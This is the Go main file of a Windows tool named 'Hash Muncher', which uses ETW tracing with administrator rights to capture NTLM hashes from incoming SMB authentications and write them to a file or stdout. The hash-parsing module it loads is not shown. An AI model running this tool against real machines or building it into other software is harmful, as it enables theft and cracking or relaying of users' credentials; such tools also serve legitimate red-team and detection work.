package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/0xrawsec/golang-etw/etw"
	"golang.org/x/sys/windows"
)

type ProviderEventID struct {
	Provider string
	EventID  uint16
}

func main() {
	outputname := flag.String("output", "", "File to write detected hashes to, uses stdout if not supplied")
	tracename := flag.String("tracename", "", "Use this fixed session name for the ETW trace rather than a random one")
	timeout := flag.Int("timeout", 0, "Automatically end capture after seconds, 0 means no timeout")

	log.Println("Hash Muncher - dumps incoming NTLM hashes from SMB service using ETW on Windows")

	flag.Parse()

	// Check that the process is running elevated, otherwise the ETW tracing will not work
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(&windows.SECURITY_NT_AUTHORITY, 2, windows.SECURITY_BUILTIN_DOMAIN_RID, windows.DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &sid)
	if err != nil {
		log.Fatalf("Could not allocate SID: %v", err)
	}
	token := windows.Token(0)
	member, err := token.IsMember(sid)
	if err != nil {
		log.Fatalf("Could not detect token membership: %v", err)
	}
	if !member {
		log.Println("Process needs to be run with elevated rights, this will probably not work")
	}

	// Setup output file or just default to stdout
	output := os.Stdout
	if *outputname != "" {
		output, err = os.Create(*outputname)
		if err != nil {
			log.Fatalf("Could not create %v: %v", *outputname, err)
		}
	}
	defer output.Close()

	// Set up ETW dumping
	sessionname := randomString(32)
	if *tracename != "" {
		sessionname = *tracename
	}
	s := etw.NewRealTimeSession(sessionname)
	defer s.Stop()

	modulemap := make(map[ProviderEventID]Module)
	resultchan := make(chan ModuleResult, 32)

	modulelist := []Module{&NTLMHash{}}
	for _, module := range modulelist {
		provider, err := module.Init(resultchan)
		if err != nil {
			log.Fatalf("Problem initializing module: %v\n", err)
		}

		for _, eventid := range provider.Filter {
			modulemap[ProviderEventID{Provider: provider.GUID, EventID: eventid}] = module
		}

		if err := s.EnableProvider(provider); err != nil {
			log.Fatalf("Problem enabling provider %v: %v\n", provider, err)
		}
	}

	// Output results
	go func() {
		for result := range resultchan {
			fmt.Fprintf(output, "%s\n", result.String())
		}
	}()

	// Consuming from the trace
	c := etw.NewRealTimeConsumer(context.Background())
	defer c.Stop()

	c.FromSessions(s)

	go func() {
		var b []byte
		var err error
		for e := range c.Events {
			if module, found := modulemap[ProviderEventID{Provider: e.System.Provider.Guid, EventID: e.System.EventID}]; found {
				module.ProcessEvent(e)
			} else {
				if b, err = json.Marshal(e); err != nil {
					panic(err)
				}
				log.Printf("Unhandled event recieved: %s\n", string(b))
			}
		}
	}()

	if err := c.Start(); err != nil {
		panic(err)
	}

	sigchan := make(chan os.Signal, 16)
	signal.Notify(sigchan, os.Interrupt, syscall.SIGTERM)

	// Auto timeout
	if *timeout > 0 {
		go func() {
			time.Sleep(time.Duration(*timeout) * time.Second)
			sigchan <- os.Interrupt
		}()
	}

	<-sigchan
}
